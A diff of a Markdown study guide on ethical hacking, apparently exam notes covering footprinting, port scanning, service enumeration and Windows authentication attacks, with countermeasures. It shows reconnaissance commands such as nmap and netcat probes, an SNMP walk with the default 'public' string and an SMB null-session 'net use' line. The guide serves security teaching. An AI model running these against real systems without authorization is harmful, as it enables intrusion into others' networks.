@@ -4,50 +4,42 @@
 *Legend*:
 - &#128163;  `Attack`: This icon identify a specific attack
 - &#128295; ` Tool:` This symbol represent the tool used to perform a certain attack
-- &#9940; ` Countermeasures:` It indicates contromeasures for a certain attack
+- &#9940; ` Countermeasures:` It indicates countermeasures for a certain attack
 
 ---
 ## Ch. 1: Footprinting
 
 ### Q: What is footprinting and which goals does it achieve? Describe the attack steps that should be performed.
 
-A: Footprinting is about **scooping out** your target of interest, understand everything there is to know about that target and how it interrelates
-with everything around it, often **without sending a single packet** to your target. It enables attackers to create a near complete profile of an organization's security posture.
+A: *Footprinting* is about **scoping out** your target of interest, understand everything there is to know about that target and how it interrelates with everything around it, often **without sending a single packet** to your target. It enables attackers to create a near complete profile of an organization's security posture.
 
-The attack steps are the following:
+The attack STEPS are the following:
 
 - **STEP 1 - Determine the scope of your activities**: 
+	Before proceeding, it's essential to define the boundaries of your assessment. Will you be gathering information about the entire organization, or are you focusing on specific subsidiaries, departments, or locations?
 
-  Before proceeding, it's essential to define the boundaries of your assessment. Will you be gathering information about the entire organization, or are you focusing on specific subsidiaries, departments, or locations?
 - **STEP 2 - Get proper authorization**: 
-  
-  Do you have authorization to proceed with your activities? (preferably in writing to avoid any misunderstandings)
+	Do you have authorization to proceed with your activities? (preferably in writing to avoid any misunderstandings).
+	
 - **STEP 3 - Publicly available information**: 
-  
   A significant amount of information about an organization can be gathered from publicly accessible sources. Examples of public information are: *Company web pages, Related organizations, Location details, Employee information, Current events, Privacy and security policies, Archived information, Search engines and data relationship*.
 
 - **STEP 4 - WHOIS and DNS Enumeration**:
-
   **Domain-Related Searches**: When you're looking up information about a **domain name** (e.g., `example.com`), here's the process:
-    - **Start with the Registry**: Each top-level domain (TLD) like `.com`, `.org`, or `.net`, has an **authoritative Registry** that manages information about which **Registrar** (a company like GoDaddy or Namecheap) is handling that domain. For `.com`, this would be a `.com` Registry.
+	- **Start with the Registry**: Each top-level domain (TLD) like `.com`, `.org`, or `.net`, has an **Authoritative Registry** that manages information about which **Registrar** (a company like *GoDaddy* or *Namecheap*) is handling that domain. For `.com`, this would be a `.com` Registry.
     - **Find the Registrar**: Once you know which Registrar is managing the domain, you query their WHOIS database. This database contains details about the domain's Registrant you are interested (the person or organization that owns the domain). 
 
     We refer to these as the *Three Rs* of WHOIS: **Registry**, **Registrar**, and **Registrant**.
 
     To start your search, you can use **ICANN** (**_Internet Corporation for Assigned Names and Numbers_**), which is the authoritative source for TLDs. ICANN provides tools to perform manual WHOIS lookups, even from the command line. The results often include details like physical addresses, phone numbers, email addresses, DNS servers, and more.
 
-    
-  **IP-Related Searches**: 
-  When you're trying to look up information about an IP address, the process is slightly different:
-
-  1. **Start with a Regional Internet Registry (RIR)**:
-  IP addresses are managed by Regional Internet Registries (RIRs), organizations that assign IP ranges to specific regions. For example ARIN (North America), RIPE NCC (Europe), APNIC (Asia-Pacific). 
-  
-  2. **Query an RIR**:
-  	Unlike domains, there isn’t one central database for all IP address lookups. However, any RIR can tell you if the IP address you're searching for falls under its management. If it doesn’t, it will redirect you to the correct RIR.
+  **IP-Related Searches**: When you're trying to look up information about an IP address, the process is slightly different:
+	  - **Start with a Regional Internet Registry (RIR)**:
+		IP addresses are managed by Regional Internet Registries (RIRs), organizations that assign IP ranges to specific regions. For example ARIN (North America), RIPE NCC (Europe), APNIC (Asia-Pacific). 
+	  - **Query an RIR**: 
+		Unlike domains, there isn’t one central database for all IP address lookups. However, any RIR can tell you if the IP address you're searching for falls under its management. If it doesn’t, it will redirect you to the correct RIR.
   
 - **STEP 5 - DNS Interrogation**: 
-  
   After identifying all the associated domains, you can begin to **query the DNS**. DNS is a distributed database used to map IP addresses to hostnames, and vice versa.
 
   &#128163; `Zone transfer`: One of the most serious misconfigurations a system administrator can make is allowing untrusted Internet users to perform a **DNS zone transfer**. A zone transfer is a process where one DNS server (usually a backup or secondary DNS server) requests and receives a complete copy of the DNS records from another (the primary DNS server). This is meant for redundancy and maintaining consistent records across servers.
@@ -81,7 +73,7 @@ The attack steps are the following:
 
   - &#128295; ` traceroute:` This program lets you view the route that a packet follow from one host to the next. Traceroute use **TTL field** in the IP packet to elicit an `ICMP TIME EXCEED` message from each router along the way. Each router that handles the packet is required to decrement the TTL field (hop counter). 
     
-    Traceroute helps you to discover the network topology by the target network, in addition to identifying access control devices. There may be multiple routing paths. Moreover, each interface may have different ACL applied. In many cases some interfaces pass your traceroute requests (ACL applied). Therefore, it’s important to map your entire network using traceroute (access path diagram).
+    Traceroute helps you to **discover the network topology** by the target network, in addition to **identifying access control devices**. There may be multiple routing paths. Moreover, each interface may have different ACL applied. In many cases some interfaces pass your traceroute requests (ACL applied). Therefore, it’s important to map your entire network using traceroute (access path diagram).
     
     > Note: ACL stands for **Access Control List**. It is a set of rules used to control network traffic and restrict access to or from a network.
   
@@ -99,21 +91,12 @@ A: Scanning is the process of identifying which systems are active and determini
 
 ### Q: What are ping sweeps? Describe at least two HOST DISCOVERY techniques, and at least one tool used to perform host discovery.
 
-A: Initially, *pinging* referred to the use of the **ICMP** protocol, 
-but the term has been extended to include **ARP**, **ICMP**, **TCP**, and **UDP**
-traffic to determine if a host is active and connected.
-A **ping sweep** is a method that can 
-**establish a range of IP addresses which map to live hosts**.
+A: Initially, *pinging* referred to the use of the **ICMP** protocol, but the term has been extended to include **ARP**, **ICMP**, **TCP**, and **UDP** traffic to determine if a host is active and connected. 
+A **ping sweep** is a method that can  **establish a range of IP addresses which map to live hosts**.
 
 **Host Discovery techniques**:
 
-- **ARP Host Discovery**: The Address Resolution Protocol (ARP) translates a 
-system’s hardware address (MAC) to the IP address that has been assigned to it.
-The system has to send some sort of ARP request to start traversing the path 
-to reach its destination. 
-An ARP scan sends an ARP request out for every host on a subnet, 
-and the host is considered *alive* if an ARP reply is received.
-
+- **ARP Host Discovery**: The Address Resolution Protocol (ARP) translates a system’s hardware address (MAC) to the IP address that has been assigned to it. The system has to send some sort of ARP request to start traversing the path to reach its destination.  An ARP scan sends an ARP request out for every host on a subnet, and the host is considered *alive* if an ARP reply is received.
   - &#128295; ` arp-scan`: Simple ARP pinging and fingerprinting utility. You must run `arp-scan` as the root user;
   - &#128295; ` Nmap` (UNIX, Windows, Mac): *de facto* tool for anything related to host and services discovery. Support arp scanning via the `-PR option`. To only perform a host discovery and not a port scanning you can specify the `-sn option`.
   - &#128295; ` Cain`: It provides a ton of functionality for the Windows-only crowd that goes way beyond hosts and service discovery.
@@ -127,16 +110,7 @@ and the host is considered *alive* if an ARP reply is received.
 
 **Tools**:
 
-- &#128295; ` Nmap` : Nmap **-sn option** enables a **hybrid-type** of attack 
-where it attempts ARP, ICMP, and TCP host discovery. 
-If the target host has TCP port 80 closed, or if packets are dropped by a 
-firewall, Nmap might incorrectly determine the host as being down.
-To work around this, you can skip Nmap’s default host discovery and 
-directly scan its default port list (1,000 common ports) 
-using a blind port scan: 
-`nmap -Pn <target>`
-This forces Nmap to ignore host discovery and proceed with 
-the port scan regardless of the host's response.
+- &#128295; ` Nmap` : Nmap **-sn option** enables a **hybrid-type** of attack where it attempts ARP, ICMP, and TCP host discovery.  If the target host has TCP port 80 closed, or if packets are dropped by a firewall, Nmap might incorrectly determine the host as being down. To work around this, you can skip Nmap’s default host discovery and directly scan its default port list (1,000 common ports) using a blind port scan: `nmap -Pn <target>` This forces Nmap to ignore host discovery and proceed with the port scan regardless of the host's response.
 
 - &#128295; ` SuperScan`: Using the TCP/UDP port scan options, you can determine whether a host is alive or not without using ICMP at all. Simply select the checkbox for each protocol you wish to use and the type of technique you desire, and you are off to the races.
 - &#128295; ` nping`: As expected, you can also use nping to perform TCP/UDP host discovery. Since nping is so versatile, its output is more verbose by default, which may be more information than you really need.
@@ -145,39 +119,37 @@ the port scan regardless of the host's response.
 
 A: **Techniques**:
 
-- **TCP Connect Scan** - This type of scan connects to the target port 
-and completes a full **three-way handshake** (SYN, SYN/ACK, and ACK):
-  - **Slower** than other scan types;
-  - **Logged** by the target system;
+- **TCP Connect Scan** - This type of scan connects to the target port and completes a full **three-way handshake** (SYN, SYN/ACK, and ACK):
+  - **Slower** than other scan types
+  - **Logged** by the target system
 - **TCP SYN Scan** - Only a SYN packet is sent to the target port. 
-  - **SYN/ACK** response → Port is LISTENING.
-  - **RST/ACK** response → Port is NOT LISTENING.
-  - **Not Logged** by the target system;
-  - This form of scanning can produce a DOS condition on the target by opening a large number of half-open connections;
-  - Relatively safe.
+  - **SYN/ACK** response → Port is LISTENING
+  - **RST/ACK** response → Port is NOT LISTENING
+  - **Not Logged** by the target system
+  - This form of scanning can produce a DOS condition on the target by opening a large number of half-open connections
+  - Relatively safe
 - **TCP FIN Scan** - Sends a FIN packet to the target port:
-  - Based on *RFC 793*, the target system should send back an RST for all closed ports;
-  - Only works on UNIX-based TCP/IP stacks.
+  - Based on *RFC 793*, the target system should send back an RST for all closed ports
+  - Only works on UNIX-based TCP/IP stacks
 - **TCP Xmas Tree scan** - This technique sends a FIN, URG, and PUSH packet to the target port:
-  - Based on RFC 793, the target system should send back an RST for all closed ports.
+  - Based on RFC 793, the target system should send back an RST for all closed ports
 - **TCP NULL Scan** - Turns off all flags:
-  - Based on RFC 793, the target system should send back an RST for all closed ports.
+  - Based on RFC 793, the target system should send back an RST for all closed ports
 - **TCP ACK Scan** - Used to map out firewall rule sets:
   - It can help determine if the firewall is a simple packet filter allowing only established connections (connections with the ACK bit set) or a stateful firewall performing advance packet filtering.
 - **TCP Windows Scan**:
   - May detect open as well as filtered/non filtered ports on some systems (AIX, FreeBSD and so on), due to an anomaly in the way the TCP window size is reported.
 - **TCP RPC Scan**:
-  - Specific in UNIX systems;
-  - Used to detect and identify RPC (Remote Procedure Call) ports, their 	associated program and version number.
+  - Specific in UNIX systems
+  - Used to detect and identify RPC (Remote Procedure Call) ports, their associated program and version number.
 - **UDP Scan** - Sends a UDP packet to the target port:
-  - ICMP "Port Unreachable" response → Port is closed.
-  - No response → Port is likely open.
-  - Very slow process.
+  - ICMP "Port Unreachable" response → Port is closed
+  - No response → Port is likely open
+  - Very slow process
 
 **Tools**:
 
 - &#128295; ` Nmap:` one of the most feature-rich port-scanning tools out there. First perform **host discovery** and by then **port scanning** only if the host that have been identified as being alive.
-
   - `option -sS`: TCP SYN Scan;
   - `option -oN`: save the report in human-readable format to a file;
   - `option -f`: **fragment the packet**, against a simple packet filter as primary firewall. Depending on the sophistication of the target network and hosts, the scans performed thus far may have easily been detected;
@@ -196,7 +168,7 @@ and completes a full **three-way handshake** (SYN, SYN/ACK, and ACK):
 
 ### Q: Discuss the differences between scanning and enumeration. Describe at least one enumeration technique.
 
-A: **Scanning** is equivalent to **inspecting the perimeter** for potential entry points. This process is typically non-intrusive and focuses on gathering surface-level information to map the target environment.
+A: **Scanning** is equivalent to **inspecting the perimeter** for potential entry points. This process is typically **non-intrusive** and focuses on gathering surface-level information to map the target environment.
 
 **Enumeration**, on the other hand, involves **digging deeper into the identified entry points** by actively interacting with the system to extract detailed information.
 
@@ -206,32 +178,21 @@ Enumeration techniques tend to be platform-specific and are, therefore, heavily 
 
 **Techniques**:
 
-- &#128163; `Basic Banner Grabbing`: Banner grabbing involves 
-**connecting to remote services and observing the output**, 
-to gather information about running services. Attacker may identify the 
-maker and model of the running service, which in many cases is enough 
-to set the vulnerability research process in motion.
+- &#128163; `Basic Banner Grabbing`: Banner grabbing involves **connecting to remote services and observing the output**, to gather information about running services. Attacker may identify the maker and model of the running service, which in many cases is enough to set the vulnerability research process in motion.
 
-  - &#128295; ` Telnet and netcat`: The simplest mechanism for 
-  enumerating banners and application info has traditionally been based on 
-  **telnet**. Using telnet to grab banners is as easy as 
-  **opening a telnet connection to a known port on the target server**, 
-  pressing ENTER a few times, if necessary, and **seeing what comes back**.
-    For a slightly more surgical probing tool, rely on **netcat**, the *TCP/IP Swiss Army knife*. 
+  - &#128295; ` Telnet and netcat`: The simplest mechanism for enumerating banners and application info has traditionally been based on **telnet**. Using telnet to grab banners is as easy as **opening a telnet connection to a known port on the target server**, pressing ENTER a few times, if necessary, and **seeing what comes back**. For a slightly more surgical probing tool, rely on **netcat**, the *TCP/IP Swiss Army knife*. 
     
     Here, we examine one of its more simplistic uses, connecting to a remote TCP/IP port and enumerating the service banner:
     ```sh
-    nc -v www.example.com 80
+	    nc -v www.example.com 80
     ```
 
   &#9940; ` Countermeasures:` 
-  - **Disable unnecessary services** to minimize exposed ports.
-  - **Implement network access control** to restrict access to critical services.
-  - **Obfuscate banners** by removing vendor and version details from the service configuration.
+  - **Disable unnecessary services** to minimize exposed ports;
+  - **Implement network access control** to restrict access to critical services;
+  - **Obfuscate banners** by removing vendor and version details from the service configuration;
 
-- &#128163; `Enumerating FTP (TCP 21)`: FTP servers often inadvertently host sensitive information. 
-Even worse, many public FTP servers allow anonymous access, 
-which attackers can exploit. 
+- &#128163; `Enumerating FTP (TCP 21)`: **FTP**  (File Transfer Protocol) servers often inadvertently host sensitive information. Even worse, many public FTP servers allow anonymous access, which attackers can exploit. 
 
 	We can use anonymous and a dummy email-address to authenticate to this anonymous service: 
 	
@@ -241,12 +202,9 @@ which attackers can exploit.
 
 	Also graphical FTP clients are available (such as FileZilla).
 
-  &#9940; ` Countermeasures`: FTP should just be turned off. Always use Secure FTP (SFTP, with SSH encryption) or FTP Secure (FTPS, with SSL) 
-  protected by strong password or certificate-based authentication.
+  &#9940; ` Countermeasures`: FTP should just be turned off. Always use Secure FTP (SFTP, with SSH encryption) or FTP Secure (FTPS, with SSL) protected by strong password or certificate-based authentication.
 
-- &#128163; `Enumerating SMTP (TCP 25)`: SMTP provides two built-in 
-commands that allow the enumeration of the users 
-(after a connection with telnet on the port 25, netcat as well):
+- &#128163; `Enumerating SMTP (TCP 25)`: **SMTP** (Simple Mail Transfer Protocol) provides two built-in commands that allow the enumeration of the users (after a connection with telnet on the port 25, netcat as well):
 
   - `vrfy <mail>` → verifies if an email address is valid;
   - `expn <mail>` → reveals the actual delivery addresses of aliases and mailing lists.
@@ -257,17 +215,14 @@ commands that allow the enumeration of the users
 
 ### Q: SNMP enumeration, which account you need, countermeasure.
 
-A: The **Simple Network Management Protocol (SNMP)**,  was 
-originally developed for network management and monitoring, 
-providing detailed information about network devices, software, and systems. However, its widespread use and relatively weak security mechanisms make it a common target of hacker attacks.
+A: The **Simple Network Management Protocol (SNMP)**, was originally developed for network management and monitoring, providing detailed information about network devices, software, and systems. However, its widespread use and relatively weak security mechanisms make it a common target of hacker attacks.
 
-&#128163; `Enumerating SNMP (UDP 161)`: SNMP relies on a basic password system known as the **SNMP community string**. It is like a user ID or password that allows access to the SNMP agent, for example, a router's, firewall’s, or other network device's statistics. Unfortunately, many implementations use **well-known default passwords**. For example, "public" is a commonly used read-only community string, and attackers often attempt to guess it or intercept it using tools like Wireshark once SNMP is identified during a port scan.
+&#128163; `Enumerating SNMP (UDP 161)`: SNMP relies on a basic password system known as the **SNMP community string**. It is like a user ID or password that allows access to the SNMP agent, for example, a router's, firewall’s, or other network device's statistics. Unfortunately, many implementations use **well-known default passwords**. For example, `public` is a commonly used read-only community string, and attackers often attempt to guess it or intercept it using tools like **Wireshark** once SNMP is identified during a port scan.
 
-What's more, many vendors extend SNMP's **Management Information Base (MIB)** to include proprietary information; for example, the Microsoft MIB contains the names of Windows user accounts. This means that even if other vulnerable ports (like TCP 139 or 445) are secured, NT systems may still miss out on similar information if you run the SNMP service in the configuration by default (which uses "public" as a community string for reading). 
+What's more, many vendors extend SNMP's **Management Information Base (MIB)** to include proprietary information; for example, the Microsoft MIB contains the names of Windows user accounts. This means that even if other vulnerable ports (like TCP 139 or 445) are secured, NT systems may still miss out on similar information if you run the SNMP service in the configuration by default (which uses `public` as a community string for reading). 
 
 
-- &#128295; `snmputil`:
-SNMP makes it relatively easy to enumerate Windows users when default settings are in place. For example, using the snmputil tool from the Microsoft Resource Kit, an attacker could execute the following command to list user accounts:
+- &#128295; `snmputil`: SNMP makes it relatively easy to enumerate Windows users when default settings are in place. For example, using the `snmputil` tool from the Microsoft Resource Kit, an attacker could execute the following command to list user accounts:
 
   ```sh
   snmputil walk 192.168.202.33 public .1.3.6.1.4.1.77.1.2.25
@@ -279,46 +234,41 @@ SNMP makes it relatively easy to enumerate Windows users when default settings a
 
   The latter is a hierarchical namespace, therefore walking up the tree (that is, using a less specific number like .1.3.6.1.4.1.77) you get much more information. Remembering all these numbers is difficult, so an intruder will use the equivalent text string (human-friendly label that correspond to the same OID). You can also use the UNIX/Linux `snmpget` tool in the net-snmp suite to query SNMP.
 
-  An hacker could use all this information to try to compromise the system. In the even worse case where the default community string was enabled for writing (for example "private"), the hacker would also be able to modify some of the parameters listed, in order to carry out a DoS attack or compromise system security.
+  An hacker could use all this information to try to compromise the system. In the even worse case where the default community string was enabled for writing (for example `private`), the hacker would also be able to modify some of the parameters listed, in order to carry out a **DoS attack** or compromise system security.
 
   A particularly useful tool for misusing default community names for SNMP writing is muts' `copy-router-config.pl`. Cisco networking devices allow anyone who knows the string to copy their configuration to a TFTP server community for writing. Having gained access to the configuration of the Cisco device, a hacker could decrypt the password or launch a brute force attack to obtain it.
 
-&#9940; ` Countermeasures`: The simplest way to prevent SNMP enumeration is to **remove or disable SNMP agents** on individual machines. If you cannot disable SNMP entirely, you must at least make sure it is configured with the community names chosen in so that they are difficult to guess (and are not, therefore, the default names "public" or "private").
+&#9940; ` Countermeasures`: The simplest way to prevent SNMP enumeration is to **remove or disable SNMP agents** on individual machines. If you cannot disable SNMP entirely, you must at least make sure it is configured with the community names chosen in so that they are difficult to guess (and are not, therefore, the default names `public` or `private`).
+
 Of course, if you use SNMP to manage your network, you must **block access to TCP and UDP ports 161** (SNMP GET/SET) in all access devices placed on the perimeter of the network. Finally, it is necessary to limit access to SNMP people by granting it only to the IP address of the appropriate management console.
 
 
 ### Q: Active Directory enumeration (Windows). Describe techniques and tools.
 
-A: &#128163; `Windows Active Directory LDAP Enumeration (TCP/UDP 389 and 3268)`: **Lightweight Directory Access Protocol (LDAP)**, which Microsoft implements as **Active Directory (AD)**, is a centralized system for
-managing and storing information about network resources such as users, computers, and groups. 
+A: &#128163; `Windows Active Directory LDAP Enumeration (TCP/UDP 389 and 3268)`: **Lightweight Directory Access Protocol (LDAP)**, which Microsoft implements as **Active Directory (AD)**, is a centralized system for managing and storing information about network resources such as users, computers, and groups. 
 Because AD is designed to contain a logical and unified representation of an organization's IT infrastructure, it contains a lot of information by enumeration.
 
-- &#128295; `ldp.exe`: is Windows LDAP client included in the **Active Directory Administration Tools** which allows users (and attacker) to connect to an 
-AD server and navigate its directory structure. An attacker can then use `ldp.exe` against a host and enumerate 
-all users and groups with an LDAP query. The only prerequisite is to create an authenticated session via LDAP, which means you have already compromised 
-an existing account on the target (have access to valid login credentials). 
+- &#128295; `ldp.exe`: is Windows LDAP client included in the **Active Directory Administration Tools** which allows users (and attacker) to connect to an AD server and navigate its directory structure. 
+ 
+	An attacker can then use `ldp.exe` against a host and enumerate all users and groups with an LDAP query. The only prerequisite is to create an authenticated session via LDAP, which means you have already compromised an existing account on the target (have access to valid login credentials). 
 
-**Step-by-Step process**:
-
-  1. **Connect to the target** using ldp. `Open Connection` &rarr; `Connect` and **enter the IP or DNS** destination server name;
-  2. Once connected to the target, **authenticate as Guest user** (already compromised) and select `Links` &rarr; `Bind` and enter the properties of the Guest;
-  3. Once the LDAP session has been established, it can be enumerated: open `View` &rarr; `Tree` and enter the root context in the dialog box (*eg. dc = labfarce, dc = org*);
-  4. A node appears in the left panel, click the + to reveal the objects under the root of the directory;
-  5. Double click on the CN = Users and CN = Builtin containers which reveal all the users e server groups.
+	**Step-by-Step process**:
+	
+	  1. **Connect to the target** using ldp. `Open Connection` &rarr; `Connect` and **enter the IP or DNS** destination server name;
+	  2. Once connected to the target, **authenticate as Guest user** (already compromised) and select `Links` &rarr; `Bind` and enter the properties of the Guest;
+	  3. Once the LDAP session has been established, it can be enumerated: open `View` &rarr; `Tree` and enter the root context in the dialog box (*eg. dc = labfarce, dc = org*);
+	  4. A node appears in the left panel, click the + to reveal the objects under the root of the directory;
+	  5. Double click on the CN = Users and CN = Builtin containers which reveal all the users e server groups.
 
 When installing AD, administrators are prompted to decide whether to loosen directory access permissions for compatibility with older systems. 
-In this way the user objects will be exposed to enumeration via LDAP. On Linux you can do the same using **LUMA**, or the Java based tool called **Jxplorer**, 
-both with GUI. For command line of a Linux tool use **ldapenum**.
+In this way the user objects will be exposed to enumeration via LDAP. On Linux you can do the same using **LUMA**, or the Java based tool called **Jxplorer**, both with GUI. For command line of a Linux tool use **ldapenum**.
 
 &#9940; ` Countermeasures`: You should **filters access to ports 389 and 3268 on the device that interfaces with the internet in the network** (network boundaries). 
-Nobody should log in without being authenticated to the ADs then restrict permissions. To keep safety you need to keep the mode native to Windows 
-(which does not include the Everyone group). Also be sure to **remove the Everyone group** (group that allows authenticated sessions with any user) 
-from pre-Windows 2000 compatible installations (less secure having this group).
+Nobody should log in without being authenticated to the ADs then restrict permissions. To keep safety you need to keep the mode native to Windows (which does not include the Everyone group). Also be sure to **remove the Everyone group** (group that allows authenticated sessions with any user) from pre-Windows 2000 compatible installations (less secure having this group).
 
 
 ### Q: Describe the technique to enumerate the Microsoft's Server Message Block (SMB) service. What information can be enumerated from the SMB service? Under what assumptions is each of such enumeration possible? Discuss the tools, explain how each of them works, and also the countermeasures for this enumeration attack. Is Microsoft providing a facility to prevent SMB enumeration?
-A: &#128163; `Server Messagge Block Enumeration (TCP 139 and 445)`: Microsoft's **Server Messagge Block (SMB)** protocol forms the **basis of
-Windows File and Print Sharing** (the Linux implementation of SMB is called Sambe). 
+A: &#128163; `Server Messagge Block Enumeration (TCP 139 and 445)`: Microsoft's **Server Messagge Block (SMB)** protocol forms the **basis of Windows File and Print Sharing** (the Linux implementation of SMB is called Sambe). 
 SMB is accessible via API's that can return rich information about Windows, even to unauthenticated users. 
 
 - **Null Sessions**: The first step in enumerating SMB is to connect to the service 
@@ -328,11 +278,8 @@ using the so-called "null session" command:
   net use \\192.168.202.33\IPC$ "" /u:"" 
   ```
 
-  This syntax connects to the hidden interprocess communications "share" (`IPC$`) at IP address `192.168.202.33`
-  as the built-in anonymous user (`\u:""`) with a null (`""`) password. 
-  If successful, the attacker now has an open channel over which to attempt 
-  the various techniques outlined in this section to pillage as much
-  information as possible from the target, including **network information, shares, users, groups, Registry keys**, and so on. 
+  This syntax connects to the hidden interprocess communications "share" (`IPC$`) at IP address `192.168.202.33` as the built-in anonymous user (`\u:""`) with a null (`""`) password. 
+  If successful, the attacker now has an open channel over which to attempt the various techniques outlined in this section to pillage as much information as possible from the target, including **network information, shares, users, groups, Registry keys**, and so on. 
 
   Called also the “Red Button” vulnerability or anonymous logon, it can be the single most devastating network foothold sought by intruders, as we will vividly demonstrate next. 
 
@@ -344,12 +291,12 @@ using the so-called "null session" command:
   - &#128295; `srvcheck and srvinfo`: These are two good share-enumeration tools (using the `-s` switch). `srvcheck`displays **shares and authorized users**, including hidden shares, but **it requires privileged access to the remote system** to enumerate users and hidden shares. `srvinfo -s` parameter lists shares along with a lot of other potentially revealing information. 
 
 
-  - &#128295; `DumpSec`: Formerly known as DumpAcl, DumpSec is one of the best tools for enumerating Windows file shares. It audits everything from
-  **file-system permissions** to **services available on remote systems**. Basic user information can be obtained even over an innocuous null connection, and it can be run from the command line, making for easy automation and scripting. DumpSec can be used to dump share information from a remote computer. 
+  - &#128295; `DumpSec`: Formerly known as DumpAcl, DumpSec is one of the best tools for enumerating Windows file shares. It audits everything from **file-system permissions** to **services available on remote systems**. Basic user information can be obtained even over an innocuous null connection, and it can be run from the command line, making for easy automation and scripting. DumpSec can be used to dump share information from a remote computer. 
 
   Opening null connections and using the preceding tools manually is great for
   directed attacks, but most hackers commonly employ a NetBIOS scanner to check
   entire networks rapidly for exposed shares. Some tools that perform these tasks are:
+
   - &#128295; `SysInternals’s` (acquired by Microsoft)
   - &#128295; `ShareEnum`: it has fewer configurable options, but, by default, it provides a good amount of information and has nice comparison features that may be useful for comparing results over time.
   - &#128295; `SoftPerfect’s Network Scanner`: it is a bit more diverse but requires some minimal configuration beyond the default
@@ -362,29 +309,17 @@ using the so-called "null session" command:
 
 ### Q: Unauthenticated Attacks VS Authenticated Attacks
 
-A: **Unauthenticated attacks** are initiated only with the knowledge 
-of the target system gained with 
-scanning and enumeration, without prior access or credentials. 
-The goal is to exploit vulnerabilities to gain a **foothold**.
+A: **Unauthenticated attacks** are initiated only with the knowledge of the target system gained with scanning and enumeration, without prior access or credentials. The goal is to exploit vulnerabilities to gain a **foothold**.
 
 The primary vectors for compromising Windows system remotely include: 
-- **Authentication spoofing**: Exploits the reliance on password-based 
-authentication. Techniques include **brute-force** or **dictionary attacks** to 
-guess passwords and **man-in-the-middle (MITM)** attacks to intercept or spoof authentication traffic.
+- **Authentication spoofing**: Exploits the reliance on password-based authentication. Techniques include **brute-force** or **dictionary attacks** to guess passwords and **man-in-the-middle (MITM)** attacks to intercept or spoof authentication traffic.
 - **Network services**: Modern tools make it easy to penetrate vulnerable services that listen on the network.
 - **Client vulnerabilities**: Client software like Internet Explorer, Outlook, Office, Adobe Acrobat Reader, and others have become frequent targets for attackers who seek to directly access user data.
 - **Device drivers**: Research into device drivers, which handle communication between the operating system and hardware like wireless adapters, USB drives, and CD-ROMs, has revealed new vulnerabilities that attackers can exploit.
 
-Once attackers have obtained access to a user account on a Windows system, 
-their next goal is to escalate privileges to gain full control of the system.
+Once attackers have obtained access to a user account on a Windows system, their next goal is to escalate privileges to gain full control of the system.
 
-**Authenticated attacks** refer to attacks carried out after the attacker 
-has already obtained valid credentials or access. 
-These attacks focus on 
-**exploiting vulnerabilities or misconfigurations to elevate privileges**, 
-such as moving from a regular user to Administrator or SYSTEM-level access, 
-allowing the attacker to execute commands with the highest privileges and 
-potentially take over the entire system.
+**Authenticated attacks** refer to attacks carried out after the attacker has already obtained valid credentials or access. These attacks focus on **exploiting vulnerabilities or misconfigurations to elevate privileges**, such as moving from a regular user to Administrator or SYSTEM-level access, allowing the attacker to execute commands with the highest privileges and potentially take over the entire system.
 
 ### Q: What are the three main network password exchange protocols used in Windows systems? Describe the pass-the-hash and pass-the-ticket attacks and countermeasures (Unauthenticated attacks). 
 
@@ -392,56 +327,24 @@ A: The three main network password exchange protocols in windows are the followi
 
 1. **LM (Lan Manager) authentication protocol**: is an outdated network 
 operating system and authentication protocol used by Microsoft for managing 
-and securing local area networks (LANs). 
-It can be exploited due to a weakness in the Windows challenge response 
-implementation that makes it easy to exhaustively guess the original LM hash credential.
+and securing local area networks (LANs). It can be exploited due to a weakness in the Windows challenge response implementation that makes it easy to exhaustively guess the original LM hash credential.
 
-2. **NTLM (New Technology LM)**: It is a challenge/response protocol. 
-The authentication  happens something like this: 
-First, the client attempts to login and the server responds with a 
-challenge &rarr; in effect the server says, If you are who you say you are, 
-then encrypt this thing (**challenge X**) with your hash &rarr; next, 
-the client encrypts the challenge and sends back the encrypted challenge 
-response &rarr; the server then attempts to decrypt that encrypted 
-challenge response with the user password hash &rarr; if it decrypts to 
-reveal the challenge that it sent, then the user is authenticated.
+2. **NTLM (New Technology LM)**: It is a challenge/response protocol. The authentication  happens something like this: 
+First, the client attempts to login and the server responds with a challenge &rarr; in effect the server says, If you are who you say you are, then encrypt this thing (**challenge X**) with your hash &rarr; next, the client encrypts the challenge and sends back the encrypted challenge response &rarr; the server then attempts to decrypt that encrypted challenge response with the user password hash &rarr; if it decrypts to reveal the challenge that it sent, then the user is authenticated.
 
-3. **Kerberos**: is a secure network authentication protocol that uses 
-**tickets** to allow nodes to communicate over an insecure network. 
-It is commonly used in distributed systems for user and service 
-authentication, with a Key Distribution Center (KDC) managing secret 
-key exchanges. This implementation sends a preauthentication packet 
-that contains a known plaintext (a timestamp) encrypted with a key 
-derived from the user password.
+3. **Kerberos**: is a secure network authentication protocol that uses **tickets** to allow nodes to communicate over an insecure network. It is commonly used in distributed systems for user and service authentication, with a Key Distribution Center (KDC) managing secret key exchanges. This implementation sends a preauthentication packet that contains a known plaintext (a timestamp) encrypted with a key derived from the user password.
 
-- &#128163; `Pass-the-Hash`: Pass-the-hash is a technique that allows an 
-attacker to authenticate to a remote server using the LM and/or NTLM hash 
-of a user’s password, eliminating the need to crack/brute-force the 
-hashes to obtain the cleartext password (which is normally used to 
-authenticate). In the context of NTLM authentication, Windows 
-password hashes are equivalent to cleartext passwords, so rather 
-than attempting to crack them offline, attackers can simply replay 
-them to gain unauthorized access. 
+- &#128163; `Pass-the-Hash`: Pass-the-hash is a technique that allows an attacker to authenticate to a remote server using the LM and/or NTLM hash of a user’s password, eliminating the need to crack/brute-force the hashes to obtain the cleartext password (which is normally used to authenticate). In the context of NTLM authentication, Windows password hashes are equivalent to cleartext passwords, so rather than attempting to crack them offline, attackers can simply replay them to gain unauthorized access. 
 
 	In 2000, Hernan Ochoa published techniques for implementing the pass-the-hash technique natively in Windows by modifying at runtime the username, domain name, and password hashes stored in memory. These allow you to pass-the-hash using Windows native applications like Windows Explorer to access remote shares administrative tools like Active Directory Users and Computers, and any other Windows native application that uses NTLM authentication. This technique has become very popular among penetration testers and attackers because it can allow the compromise of the whole Windows domain after compromising a single machine.
 
   &#9940; ` Countermeasures`: The pass-the-hash technique is inherent to the NTLM authentication protocol; all services using this authentication method (SMB, FTP, HTTP, etc.) are vulnerable to this attack. **Using two-factor authentication** might help in some situations, but in most network environments, you will most likely have to live with the possibility of the attack.
 
-- &#128163; `Pass the Ticket for Kerberos`: When using Kerberos 
-authentication, clients authenticate to remote services on remote systems 
-using “tickets” and create new tickets using the 
-**Ticket Granting Ticket (TGT)** provided by the Key Distribution Center 
-(KDC), which is part of the domain controller, on logon. 
